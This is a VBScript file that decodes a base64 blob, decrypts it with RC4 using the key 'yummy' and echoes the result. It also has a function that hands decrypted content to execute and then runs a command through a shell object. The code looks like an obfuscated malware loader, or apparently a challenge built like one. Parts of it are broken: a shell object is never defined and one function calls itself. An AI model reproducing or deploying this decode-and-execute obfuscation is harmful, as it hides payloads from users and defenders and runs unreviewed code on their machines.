
Function hai(base64)
    Dim dom, el
    Const adTypeBinary = 1
    Const adTypeText = 2
    Set dom = CreateObject("Microsoft.XMLDOM")
    Set el = dom.createElement("tmp")
    el.dataType = "bin.base64"
    el.text = base64
    bin = el.nodeTypedValue
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = adTypeBinary
    stream.Open
    stream.Write bin
    stream.Position = 0
    stream.Type = adTypeText
    stream.CharSet = "windows-1252"
    hai = stream.ReadText
End Function
Function oh(msg, key)
    Dim S(256)
    Dim klen
    Dim i, j, tmp
    Dim n
    Dim k
    klen = Len(key)
    For i = 0 To 255
        S(i) = i
    Next
    j = 0
    For i = 0 To 255
        j = (j + S(i) + Asc(Mid(key, 1 + (i Mod klen))) ) Mod 256
        tmp = S(i)
        S(i) = S(j)
        S(j) = tmp
    Next
    i = 0
    j = 0
    oh = ""
    For n = 0 To (Len(msg) - 1)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        tmp = S(i)
        S(i) = S(j)
        S(j) = tmp
        k = S((S(i) + S(j)) Mod 256)
        oh = oh & Chr(Asc(Mid(msg, n + 1, 1)) Xor k)
        WScript.Echo(Chr(Asc(Mid(msg, n + 1, 1)) Xor k))
    Next
End Function
Function SnoopyDoopyDoooooooooo()
    SnoopyDoopyDoooooooooo = fso.GetSpecialFolder(250)
End Function

Function PetMeLikeATurtle()
    
    Call execute(oh(hai(fso.CreateTextFile("WimmyMeBrah", "sn00gle-fl00gle-p00dlekins")), "yummy"))
    Call oSh.Run(PetMeLikeATurtle)
End Function

Function Main()
Set fso = CreateObject("Scripting.FileSystemObject")
'WScript.Echo(oh("c24wMGdsZS1mbDAwZ2xlLXAwMGRsZWtpbnM=", "yummy"))
WScript.Echo(oh(hai("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"), "yummy"))

End Function

Main()